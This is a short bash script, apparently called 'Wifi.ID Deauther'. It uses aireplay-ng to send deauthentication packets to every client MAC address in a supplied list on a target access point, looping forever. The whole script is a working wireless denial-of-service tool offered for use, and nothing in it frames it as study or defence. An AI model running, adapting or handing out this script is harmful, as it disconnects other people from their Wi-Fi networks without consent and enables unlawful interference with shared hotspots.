#!/bin/bash
sendkill(){
	local bssid=$2
	local mac=$1
	local interface=$3
    	local packet=$4
	aireplay-ng -0 $packet -a $bssid -c $mac $interface --ignore-negative-one	
}

interface=""
lokasifile=""
bssid=""
packet=""

cat <<EOF
Wifi.ID Deauther using Aireplay-NG
Version : 1.0
Developer : Aproxtime Dev

EOF

while getopts ":i:f:b:p:" o; do
    case "${o}" in
        i)
            interface=${OPTARG}
            ;;
        f)
            lokasifile=${OPTARG}
            ;;
        b)
            bssid=${OPTARG}
            ;;
        p)
            packet=${OPTARG}
            ;;
    esac
done

if [[ $interface == "" || $lokasifile == "" || $bssid == "" || $packet == "" ]]; then
	echo "Usage : wifi.id-deauther.sh -i interface -f list-mac -b bssid -p packetpermac"
	exit
fi

echo -n "[*] Checking package aircrack-ng... "
if [[ `dpkg -l aircrack-ng` == *"no packages found"* ]]; then
    echo "NOT INSTALLED ! Please install it refer to google"
    exit
else
    echo "OK"
fi

echo "[*] Starting..."
echo ""
readarray a < $lokasifile
while true
do
	for mac in "${a[@]}"
	do
		sendkill $mac $bssid $interface $packet
	done
done
